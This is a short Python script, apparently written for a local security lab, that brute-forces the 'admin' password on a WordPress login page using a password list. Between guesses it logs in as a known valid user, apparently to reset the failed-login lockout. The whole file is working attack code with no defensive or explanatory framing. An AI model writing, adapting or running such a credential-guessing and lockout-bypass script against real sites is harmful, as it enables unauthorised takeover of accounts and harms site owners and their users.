import requests

f = open("Hint_passwords.txt")
pwds = f.readlines()
index = 0

user = 'think'
found = False
while not found or user == 'think':

    if user == 'think':
        # to pass values to the form
        payload={
        'log':'think',
        'pwd':'123'
        }

    else:

         payload={'log':'admin','pwd':'{}'.format(pwds[index])}

    r = requests.post('http://localhost/cybersec/wp-login.php', data = payload)

    try:
        
        if str(r.history[0]) == "<Response [302]>" and user == "admin":
            found = True
            print(pwds[index], "WE INN!!")
            break
    except:
        found = False
    
    if user == "admin":
        user = "think"
        index += 1
        print("Retrying")
    else:
        user = "admin"